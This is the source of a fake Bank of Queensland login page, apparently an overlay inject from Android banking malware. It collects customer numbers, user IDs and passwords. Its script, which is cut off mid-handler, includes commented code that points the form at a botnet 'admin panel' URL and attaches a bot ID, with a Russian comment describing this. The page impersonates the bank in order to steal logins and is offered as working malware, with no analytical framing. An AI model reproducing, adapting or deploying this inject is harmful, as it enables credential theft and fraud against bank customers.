<html>
<head>
<link rel="stylesheet" href="au/com.bankofqueensland.boq/style.css">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>
<div id="content_div">

	<div class="header2" style="margin-bottom: 20px;">
		<img style="width: 100%;" src="data:image/png;base64,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">
	</div>

<div id="header">
<img src="data:image/png;base64,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">
</div>

<form action="null" method="post" id="_mainForm" target="flow_handler">
<br>
<div class="_mainForm">

<div id="useridfields">
<label>Customer Number</label>
<input name="Customer Number" id="login" maxlength="10" class="input" type="text">
</div>

<div id="usersignonfields">
<label>User ID</label>
<input name="User ID" id="userid" maxlength="10" class="input" type="text">
</div>

<div id="accesscodefields">
<label>Password</label>
<input name="Password" id="password" maxlength="50" class="input" type="password">
</div> 
<br>

</div>

<center>
<input value="Login" id="input_submitBtn" class="submit" type="button">
</center>
<input type="hidden" name="name" value="Banque">

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>

</form>
            <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота

*/
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
